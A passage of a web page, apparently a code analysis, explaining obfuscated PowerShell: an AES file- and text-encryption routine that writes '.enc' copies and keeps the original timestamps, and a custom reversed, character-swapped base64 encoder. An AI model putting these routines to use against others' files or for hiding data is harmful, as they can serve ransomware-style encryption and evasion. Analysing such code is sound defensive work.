1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>\u003Ccode>$Key\u003C/code> for encrypt and decrypt.\u003C/li>\n\u003Cli>\u003Ccode>$Text\u003C/code> is plaintext to encrypt.\u003C/li>\n\u003Cli>\u003Ccode>$Path\u003C/code> is path to file to encrypt.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>Begin block:\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Begin\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $m95I \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.SHA256Managed\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.AesManaged\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.CipherMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::CBC\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.Padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.PaddingMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::PKCS7\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.BlockSize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 128\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.KeySize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 256\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"Begin {\n    $m95I = New-Object System.Security.Cryptography.SHA256Managed\n    $n9ibn = New-Object System.Security.Cryptography.AesManaged\n    $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\n    $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n    $n9ibn.BlockSize = 128\n    $n9ibn.KeySize = 256 }\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>Create SHA256 hash\u003C/li>\n\u003Cli>Set AES encryption to \u003Ccode>CBC\u003C/code> with \u003Ccode>PKCS7\u003C/code> and \u003Ccode>256 bit\u003C/code> key. Block Size is \u003Ccode>128 bit\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>Process block:\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Process\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.Key \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $m95I.ComputeHash([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Key))\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {$plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Text)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       $File \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path $Path \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ErrorAction SilentlyContinue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">       if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$File.FullName) { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       $plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ReadAllBytes($File.FullName)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       $outPath \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.FullName \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \".enc\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $encryptor \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.CreateEncryptor()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptor.TransformFinalBlock($plainBytes\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 0\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $plainBytes.Length)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.IV \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">    $n9ibn.Dispose()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Convert\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ToBase64String($encryptedBytes)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">    if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::WriteAllBytes($outPath\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $outPath).LastWriteTime \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.LastWriteTime }}\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"Process {\n    $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n    if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n    if ($Path) {\n       $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n       if (!$File.FullName) { break }\n       $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n       $outPath = $File.FullName + &#x22;.enc&#x22; }\n    $encryptor = $n9ibn.CreateEncryptor()\n    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n    $encryptedBytes = $n9ibn.IV + $encryptedBytes\n    $n9ibn.Dispose()\n    if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n    if ($Path) {\n       [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n       (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cul>\n\u003Cli>First it hashes the \u003Ccode>$Key\u003C/code> using \u003Ccode>SHA-256\u003C/code> and stores it in \u003Ccode>$n9ibn\u003C/code>\u003C/li>\n\u003Cli>If \u003Ccode>$Text\u003C/code> is provided, it encrypts it\u003C/li>\n\u003Cli>If \u003Ccode>$Path\u003C/code> is provided, it reads the file’s bytes and encrypts them\u003C/li>\n\u003Cli>It creates an AES Encryptor with the key and a random IV\u003C/li>\n\u003Cli>Encrypts the plaintext bytes and stores them in \u003Ccode>$encryptedBytes\u003C/code>\u003C/li>\n\u003Cli>The IV is added to the encrypted data\u003C/li>\n\u003Cli>Return \u003Ccode>base64\u003C/code> encoded text or file\u003C/li>\n\u003Cli>Clean up AES resources\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"r64encoder\">\u003Ch4 id=\"r64encoder\">R64Encoder\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> R64Encoder\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-t\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { $VaFQ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Convert\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ToBase64String([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])) }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-f\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { $VaFQ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Convert\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ToBase64String([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ReadAllBytes(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])) }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $VaFQ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $VaFQ.Split(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"=\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">0\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] ; $VaFQ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $VaFQ.Replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"C\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) ; $VaFQ \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $VaFQ.Replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"E\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"_\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $8bKW \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $VaFQ.ToCharArray() ; [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">array\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::Reverse($8bKW) ; $R64Base \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -join\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $8bKW ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $R64Base }\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"function R64Encoder { \n   if ($args[0] -eq &#x22;-t&#x22;) { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }\n   if ($args[0] -eq &#x22;-f&#x22;) { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }\n   $VaFQ = $VaFQ.Split(&#x22;=&#x22;)[0] ; $VaFQ = $VaFQ.Replace(&#x22;C&#x22;, &#x22;-&#x22;) ; $VaFQ = $VaFQ.Replace(&#x22;E&#x22;, &#x22;_&#x22;)\n   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 